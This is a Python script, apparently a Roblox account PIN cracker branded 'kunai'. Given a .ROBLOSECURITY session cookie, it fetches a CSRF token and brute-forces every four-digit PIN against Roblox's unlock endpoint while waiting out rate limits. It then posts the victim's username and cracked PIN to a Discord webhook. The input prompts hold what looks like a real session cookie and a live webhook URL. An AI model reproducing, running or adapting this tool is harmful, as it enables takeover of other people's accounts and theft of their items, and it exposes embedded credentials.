import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_1843D20DBED28CDD036E53AB75FDBC61F68C0C39AD8353D313582FF54A28FA2C9496AD2D98D729AAB107CAD2B3CF7D0E3ADA0F5F471CB881242815582D50A00AA029AD40585FDBC9B25A631DE35BBBD550E605A59EA8247315A9BBD33C54B7E2D3B9FEFD5E4C27C0AE977118E2266D5F102A6FF899EC27CE71521A61FB7769484C95FFB27432F7BB11B8B3E5293DC0D7B96043FD7796A5E3A0CF993D44433A9C3199C350E74089027DEA48A0EB7800A6557D93BBA10A26DD5915ABCBC3A4A14A1F5DC0AD4A8C9FD4B540130FF266E736E67FB5E1ED89DC70C13BAC956C28413D0DD381FF09DB84B2EE7E63C2B8950947E2D4376236DCD58CB2A33791D019EBD757F47BDA65EC24ACBF6EA63809C386C36C9C81C46CDC6207992948B7EDED9B43DA3849511368D6DBE9E64F67DD1A478C300C63B2A783BD7FEE89BCF2E5A068211E64EB7FB1CF10EF0AAC1D0EC83987DE44236A4E')
cookie = input()
os.system("cls")
print('')
print('Enter your webhook below:https://discord.com/api/webhooks/960518954902769734/r3x-y11PBI749d1Wa4t2zTuPTVngitv7lTB5HHtElfkH8p23xpkzf2oF4fXMpMWYiFpT')
webhook = input()
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked! Join Our Discord : https://discord.gg/kunai***'
os.system("cls")

print('''Cracker Has Started.''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "kunai;",
                "avatar_url" : "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
